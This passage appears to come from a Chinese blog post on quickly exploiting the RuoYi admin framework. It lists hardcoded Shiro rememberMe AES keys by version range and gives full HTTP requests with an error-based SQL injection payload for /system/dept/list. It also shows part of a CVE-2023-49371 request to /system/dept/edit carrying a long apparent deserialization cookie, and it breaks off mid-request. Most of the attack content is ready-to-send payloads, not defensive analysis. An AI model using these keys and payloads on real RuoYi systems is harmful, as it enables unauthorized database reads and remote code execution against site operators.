+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/6.png"
+	width="2517"
+	height="1010"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/6_hufce18d7be4a6a2dcb9b4787eae58b92c_375590_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/6_hufce18d7be4a6a2dcb9b4787eae58b92c_375590_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="249"
+		data-flex-basis="598px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/7.png"
+	width="1462"
+	height="889"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/7_huac467c06826cd71f490d64b83a112663_83323_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/7_huac467c06826cd71f490d64b83a112663_83323_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="164"
+		data-flex-basis="394px"
+	
+></p>
+<h3 id="24ruoyi-462版本shiro反序列化漏洞">2.4.RuoYi &lt;<strong>4.6.2版本Shiro反序列化漏洞</strong>
+</h3><p><strong>影响版本：RuoYi&lt;4.6.2</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="err">≤</span><span class="n">4</span><span class="p">.</span><span class="na">3</span><span class="p">.</span><span class="na">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">fcq</span><span class="o">+/</span><span class="n">xw488hmtcd</span><span class="o">+</span><span class="n">cmj3aq</span><span class="o">==</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">4</span><span class="p">.</span><span class="na">3</span><span class="p">.</span><span class="na">0</span><span class="o">&lt;</span><span class="w"> </span><span class="n">Ruoyi</span><span class="w"> </span><span class="o">&lt;</span><span class="n">4</span><span class="p">.</span><span class="na">6</span><span class="p">.</span><span class="na">2</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">zsyk5kp6pzaajlt</span><span class="o">+</span><span class="n">eenmlg</span><span class="o">==</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/8.png"
+	width="2006"
+	height="1024"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/8_hu0f5ee8c5d3564920c27106b305602cc8_267010_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/8_hu0f5ee8c5d3564920c27106b305602cc8_267010_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="195"
+		data-flex-basis="470px"
+	
+></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/9.png"
+	width="1452"
+	height="1110"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/9_hu6fa21ee0b65987f7a17f1b7380d00bed_128843_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/9_hu6fa21ee0b65987f7a17f1b7380d00bed_128843_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="130"
+		data-flex-basis="313px"
+	
+></p>
+<h3 id="25ruoyi462版本sql注入漏洞"><strong>2.5.Ruoyi&lt;4.6.2版本SQL注入漏洞</strong>
+</h3><p><strong>影响版本：RuoYi&lt;4.6.2</strong></p>
+<p><strong>影响接口：</strong></p>
+<p><strong>/system/role/list</strong></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/10.png"
+	width="2537"
+	height="1009"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/10_hueb4e5ba460b08328584de67d48f0abb6_376247_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/10_hueb4e5ba460b08328584de67d48f0abb6_376247_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="251"
+		data-flex-basis="603px"
+	
+></p>
+<p><strong>/system/role/export</strong></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/11.png"
+	width="2555"
+	height="1049"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/11_hu7467acfbe26dc0d8b0263f4bbbc4c8b7_382933_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/11_hu7467acfbe26dc0d8b0263f4bbbc4c8b7_382933_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="243"
+		data-flex-basis="584px"
+	
+></p>
+<p><strong>/system/user/list</strong></p>
+<p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/12.png"
+	width="2541"
+	height="999"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/12_hu9b6885bb86014a3b64ec653c0396e446_384602_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/12_hu9b6885bb86014a3b64ec653c0396e446_384602_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="254"
+		data-flex-basis="610px"
+	
+></p>
+<p><strong>/system/dept/list</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">dept</span><span class="o">/</span><span class="n">list</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Not(A:Brand&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;24&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Chromium&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;122&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="o">*/*</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">122</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">6261</span><span class="p">.</span><span class="na">112</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">platform</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Windows&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">same</span><span class="o">-</span><span class="n">origin</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">cors</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">empty</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1/system/user</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">9b2fa9cc</span><span class="o">-</span><span class="n">71ce</span><span class="o">-</span><span class="n">4a5e</span><span class="o">-</span><span class="n">ad46</span><span class="o">-</span><span class="n">a9c82d44edfb</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">75</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">params</span><span class="o">[</span><span class="n">dataScope</span><span class="o">]=</span><span class="n">and</span><span class="w"> </span><span class="nf">extractvalue</span><span class="p">(</span><span class="n">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="n">0x7e</span><span class="p">,(</span><span class="n">select</span><span class="w"> </span><span class="nf">database</span><span class="p">()),</span><span class="n">0x7e</span><span class="p">))</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/13.png"
+	width="2560"
+	height="910"
+	srcset="/p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/13_hu21575ee41330a1156f417ca28dfb97bd_369535_480x0_resize_box_3.png 480w, /p/ruoyi%E5%BF%AB%E9%80%9F%E6%89%93%E7%82%B9/image/13_hu21575ee41330a1156f417ca28dfb97bd_369535_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="img"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="281"
+		data-flex-basis="675px"
+	
+></p>
+<h3 id="26ruoyi460版本ancestors-参数-sql-注入cve-2023-49371">2.6.Ruoyi&lt;=4.6.0版本ancestors 参数 SQL 注入（<strong>CVE-2023-49371）</strong>
+</h3><p><strong>影响版本：RuoYi ≤ 4.6.0</strong></p>
+<p><strong>影响接口：/system/dept/edit</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">dept</span><span class="o">/</span><span class="n">edit</span><span class="w"> </span><span class="n">HTTP</span><span class="o">/</span><span class="n">1</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Host</span><span class="p">:</span><span class="w"> </span><span class="n">127</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Length</span><span class="p">:</span><span class="w"> </span><span class="n">231</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Not(A:Brand&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;24&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;Chromium&#34;</span><span class="p">;</span><span class="n">v</span><span class="o">=</span><span class="s">&#34;122&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Accept</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">json</span><span class="p">,</span><span class="w"> </span><span class="n">text</span><span class="o">/</span><span class="n">javascript</span><span class="p">,</span><span class="w"> </span><span class="o">*/*</span><span class="p">;</span><span class="w"> </span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">01</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span><span class="w"> </span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="p">;</span><span class="w"> </span><span class="n">charset</span><span class="o">=</span><span class="n">UTF</span><span class="o">-</span><span class="n">8</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">X</span><span class="o">-</span><span class="n">Requested</span><span class="o">-</span><span class="n">With</span><span class="p">:</span><span class="w"> </span><span class="n">XMLHttpRequest</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">mobile</span><span class="p">:</span><span class="w"> </span><span class="o">?</span><span class="n">0</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">User</span><span class="o">-</span><span class="n">Agent</span><span class="p">:</span><span class="w"> </span><span class="n">Mozilla</span><span class="o">/</span><span class="n">5</span><span class="p">.</span><span class="na">0</span><span class="w"> </span><span class="p">(</span><span class="n">Windows</span><span class="w"> </span><span class="n">NT</span><span class="w"> </span><span class="n">10</span><span class="p">.</span><span class="na">0</span><span class="p">;</span><span class="w"> </span><span class="n">Win64</span><span class="p">;</span><span class="w"> </span><span class="n">x64</span><span class="p">)</span><span class="w"> </span><span class="n">AppleWebKit</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w"> </span><span class="p">(</span><span class="n">KHTML</span><span class="p">,</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">Gecko</span><span class="p">)</span><span class="w"> </span><span class="n">Chrome</span><span class="o">/</span><span class="n">122</span><span class="p">.</span><span class="na">0</span><span class="p">.</span><span class="na">6261</span><span class="p">.</span><span class="na">112</span><span class="w"> </span><span class="n">Safari</span><span class="o">/</span><span class="n">537</span><span class="p">.</span><span class="na">36</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sec</span><span class="o">-</span><span class="n">ch</span><span class="o">-</span><span class="n">ua</span><span class="o">-</span><span class="n">platform</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;Windows&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Origin</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Site</span><span class="p">:</span><span class="w"> </span><span class="n">same</span><span class="o">-</span><span class="n">origin</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Mode</span><span class="p">:</span><span class="w"> </span><span class="n">cors</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Sec</span><span class="o">-</span><span class="n">Fetch</span><span class="o">-</span><span class="n">Dest</span><span class="p">:</span><span class="w"> </span><span class="n">empty</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Referer</span><span class="p">:</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="c1">//127.0.0.1/system/dept/edit/100</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Encoding</span><span class="p">:</span><span class="w"> </span><span class="n">gzip</span><span class="p">,</span><span class="w"> </span><span class="n">deflate</span><span class="p">,</span><span class="w"> </span><span class="n">br</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Accept</span><span class="o">-</span><span class="n">Language</span><span class="p">:</span><span class="w"> </span><span class="n">zh</span><span class="o">-</span><span class="n">CN</span><span class="p">,</span><span class="n">zh</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="n">0</span><span class="p">.</span><span class="na">9</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Cookie</span><span class="p">:</span><span class="w"> </span><span class="n">JSESSIONID</span><span class="o">=</span><span class="n">6d01744f</span><span class="o">-</span><span class="n">6049</span><span class="o">-</span><span class="n">4e6f</span><span class="o">-</span><span class="n">95bc</span><span class="o">-</span><span class="n">f75fe586f8fb</span><span class="p">;</span><span class="w"> </span><span class="n">rememberMe</span><span class="o">=</span><span class="n">y7DzmskMFJkCY0cz9BfNLIIju6asUB4xHXvuPwy8M5gl</span><span class="o">+</span><span class="n">Y6iiLOYbsDfHGz</span><span class="o">+</span><span class="n">gPjOB8ifnHXtDOr3okkibH83q5S91CXeJ0WmAiBCov2bFoVfwDvjOOxO5CnxkH7GvZxc5A1xuQmsBTs3XPtkJ3z2t07XEOR591B7GEgAMkFVHN</span><span class="o">/+</span><span class="n">LeGpM0ryuP4dLL9bIqMF4Xjgy8OREhWlDQk2</span><span class="o">/</span><span class="n">iSJZ6RuN9keHrKtKtsfwxE4edIu3Uy8PtaWdl0ScqLilL8LRVIQGkP1XRRV9RMUwdILIg</span><span class="o">/</span><span class="n">jmyZogq1deyvGsSBDXBZg</span><span class="o">/</span><span class="n">MnGsj6GqZsNgGr1j5hkGtlk3UIk06fG</span><span class="o">+</span><span class="n">SAQxEbblLVaZVdifXBckPC4kxo</span><span class="o">+</span><span class="n">1NP</span><span class="o">+</span><span class="n">om7QsEp7CDW1IlvD9UXFhcOw9Rajn7LkogI</span><span class="o">/</span><span class="n">y9cA7FhzXh8bn</span><span class="o">++</span><span class="n">4x4UMgrUw44pf5</span><span class="o">+</span><span class="n">Tq26BcnaTmj8Bs3K012BD15mqf8WdSWl28LuqUTKl971EuDVQlAM</span><span class="o">+</span><span class="n">nFp2TPBW9SJXPr</span><span class="o">+</span><span class="n">OrkCmsnNlxZT6ouzSGNTB64</span><span class="o">++</span><span class="n">l9v0pMDB3LvFszvLrBIamoGuHNpawt0IOfoLXHorbL9x2BK6zhlUSsWLSgeM5nlJT5mt5JY9</span><span class="o">/</span><span class="n">lbHF7oXzE3Zyfq2N3uzg2EjHztDazQT</span><span class="o">+</span><span class="n">ZU8RYFT6oKCxI5Ool7auZYlTcP4QTW</span><span class="o">+</span><span class="n">LMAeZPoUQU41tX6w4fXarGgT3HqBqSg</span><span class="o">/</span><span class="n">pZVtk</span><span class="o">+</span><span class="n">pw91ZaE10xfsk4BwSdoIJuYdlB3FdTHbxXEK08</span><span class="o">+</span><span class="n">kkx3ulUkXaVnVXtDVsxhE9MJnO06TQHj6wCiXnCxyKqBCS9VjDLPx4ZUJqR1</span><span class="o">+</span><span class="n">7uqUCcjOyiDvxNoq5SPwW8GgQmm1jWG7</span><span class="o">/</span><span class="n">OEdrrF5Js1WWdGaH8uDsQjDGhHVGxFijsnAYGEl</span><span class="o">+</span><span class="n">UflWkCFvXWw3tqPFE2AiMlV2nQBc</span><span class="o">/+</span><span class="n">W5pRPzGASrFsO8nCnbqyTXRKRTbfiFJyygkDq4q4tOUesQGlC6VSIbI6p</span><span class="o">/</span><span class="n">wkmQhn7J8LElHun9VglGyye2oiHTkpPePSm2oYZ</span><span class="o">/</span><span class="n">kx6I</span><span class="o">/</span><span class="n">Bt0luiAvXuMSHKH</span><span class="o">/</span><span class="n">exWEwamUEdBHSaOrWgFPGCPVXJA3baK</span><span class="o">+</span><span class="n">b4zL6rcRxUPCXX</span><span class="o">/</span><span class="n">rTiYoBc87fWRaPa0k3FHcBwSAhvK1v1tMSXuGdkWVt06ybf8wJ8wfGXrd4fDYZauWzWK0QVz01ZCY0M7ESY7QN5fb8FWWuLRgl0VMKO0rydkLh</span><span class="o">+</span><span class="n">JMdsmW6</span><span class="o">+</span><span class="n">VcHxad1R876zqLZ16qyjj5v7LEwuBOURu6DoMqkVMaf</span><span class="o">+</span><span class="n">keof3w4Kigz0wDzWaMaLUk0er6bGe</span><span class="o">/</span><span class="n">Kd2SpJ6133449Qi6VNknNTKHQ6QsC0oMKUhedNacTj4zfnezIFOjby7A2vgZgP62</span><span class="o">+</span><span class="n">okht24bW8BJzdlNJT0yEdg2QwIefo</span><span class="o">+</span><span class="n">dbywIDp0DWYdNRul05EvspNj1k6a0kz2MJKs6iIWvKFpLwtoGC3maoOcaHzK7Tlli</span><span class="o">+</span><span class="n">JHKyJLL</span><span class="o">/</span><span class="n">cS5tN44LXNAA76ole8H6bRElgfTK4FUq9vW2BZIoBatbIL1sgeB5Pcw5FPstOEJGwrngvFdfcoKGSXRxjXvtPN2jCEiNVbjUi3Ku11rqs9BiYAPxsa</span><span class="o">+</span><span class="n">aeNUPXgXmhtMn0lCPiXRd45</span><span class="o">+</span><span class="n">48fndx</span><span class="o">/</span><span class="n">GsbNF6KMlJwnwmcVaxYs9lhXDemrNDWQ7</span><span class="o">/</span><span class="n">y1SLURePwiO1gmEplRG5shKj8dW5cehLBVKam7ckRcnDmW4FkCARunZalVX3Jt</span><span class="o">+</span><span class="n">5lsupGxILFo47gsd</span><span class="o">+</span><span class="n">bZ64jOKUWcPTg24ThkfXT2wElZbdaPhdlqC5UQg5zz8Qq03JYAfhSFqwDr4nZKQEedNc7uo9</span><span class="o">+</span><span class="n">ROs5AO2YuHphhjWvGVpIzlhfj0vODKT8c</span><span class="o">+</span><span class="n">jo7LjMPGzdpONMShm9Wrecm5DtKscBjHj3Rs4T9hQqROTQSTP72rZcCYbrDEmK2r6STC4flPA04CTl43RfmtsR0AQ7sKsnLsFwxSJLWs</span><span class="o">+</span><span class="n">hspsJ20ApF3sA</span><span class="o">++</span><span class="n">a4oz1LvZepai2uFrX8kLzPjM1LNCWfjyIaGkTC</span><span class="o">+</span><span class="n">23533MlzgZClgVb4AZQ8T6L9TxBUqYXTDMInGaTXi</span><span class="o">+</span><span class="n">MRyL2GgV5BSmo5NLRCg4X5Q3Xlh9Qnv0Hk8HHTrM3XBGoteuuY3hO63Ebf</span><span class="o">/</span><span class="n">566hWXzhR2NbANCmrDJ6</span><span class="o">/</span><span class="n">aj2H8TZIr0ah6HFJtfLLbI5AwEYaHlOwD</span><span class="o">+</span><span class="n">K</span><span class="o">/</span><span class="n">LNtTz0L5atrbck8zbgLrWXMQp2yuxARY4YLS9ykFE4r</span><span class="o">/</span><span class="n">ZZpowMpMRhzbPhtb8WuaDcuAELio7</span><span class="o">+</span><span class="n">tdvLp4Awk8k54gefZjzRlg4Jqf8</span><span class="o">+</span><span class="n">mrRypDSls0GrATSEziUL26EUHs</span><span class="o">/</span><span class="n">T29QZkh9</span><span class="o">/</span><span class="n">PtC</span><span class="o">/</span><span class="n">uPtmKkudNUm2U6eNe83Tf7Bj</span><span class="o">/</span><span class="n">PbMUhkMiQQUfiqiazUOspXlTSksTt66EIQpsTCDi0LMPzJY</span><span class="o">+</span><span class="n">xWQZyoYyM2etrjyo</span><span class="o">/</span><span class="n">xwBu90pnTW5s4c</span><span class="o">/</span><span class="n">yxtpJng0</span><span class="o">+</span><span class="n">b</span><span class="o">+</span><span class="n">O8V5F8gv</span><span class="o">/</span><span class="n">X16r</span><span class="o">/</span><span class="n">c13i</span><span class="o">+</span><span class="n">Abk</span><span class="o">/</span><span class="n">ArdLjiQHGamKR28HJfcLL5zKbl1UW8qMBXqazqYVV7wGSIGPhaZSjNSF7EoWDPW0phqq12zPL2emvIgNVKJB9o9DB05FXwDWQyws3FkKku5dKQa9wCDXSu</span><span class="o">/</span><span class="n">7ZAL8fTS84hjOmVtgy3PzUeZG64RWMey</span><span class="o">+</span><span class="n">eAn1BSx2M6TBRFSRrSLBqwgcE</span><span class="o">/</span><span class="n">tdky1lJTOEwCbnuRmvxXrzj642d5TV1rDaUiwOZEkhhQMMeBBWio5QXiQuqtkLSeHhyR0kaeOBTrGOBMfWVVe4p7kBr3O1PEsYYNm</span><span class="o">/</span><span class="n">cz8T2RWOyViwKf8VbriqYRC</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nl">Connection</span><span class="p">:</span><span class="w"> </span><span class="n">close</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
